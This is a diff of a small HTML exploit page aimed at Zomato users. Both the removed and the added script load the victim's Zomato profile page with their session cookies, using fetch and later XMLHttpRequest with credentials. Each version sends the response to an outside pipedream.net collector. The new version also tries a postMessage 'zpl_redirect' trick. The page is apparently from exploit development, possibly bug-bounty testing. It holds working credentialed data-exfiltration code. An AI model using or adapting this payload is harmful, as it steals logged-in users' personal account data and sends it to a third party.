@@ -1,13 +1,20 @@
 <html><body>
 <script>
-  fetch("https://www.zomato.com/webroutes/getPage?page_url=/profile", {
-    credentials: "include"
-  })
-  .then(r => r.text())
-  .then(data => {
-    document.body.innerHTML = data;
-    fetch("https://eomfuajl79ed6za.m.pipedream.net", {method:"POST", body:data});
-  })
-  .catch(e => document.body.innerHTML = "err: " + e);
+  // try postMessage to trigger zpl_redirect
+  window.postMessage(JSON.stringify({
+    action: "zpl_redirect",
+    redirect_url: "https://www.zomato.com/webroutes/getPage?page_url=/profile"
+  }), "*");
+
+  // also try XMLHttpRequest instead of fetch
+  var xhr = new XMLHttpRequest();
+  xhr.withCredentials = true;
+  xhr.open("GET", "https://www.zomato.com/webroutes/getPage?page_url=/profile");
+  xhr.onload = function() {
+    fetch("https://eomfuajl79ed6za.m.pipedream.net", {method:"POST", body:xhr.responseText});
+    document.body.innerHTML = xhr.responseText;
+  };
+  xhr.onerror = function(e) { document.body.innerHTML = "XHR err: " + e; };
+  xhr.send();
 </script>
 </body></html>
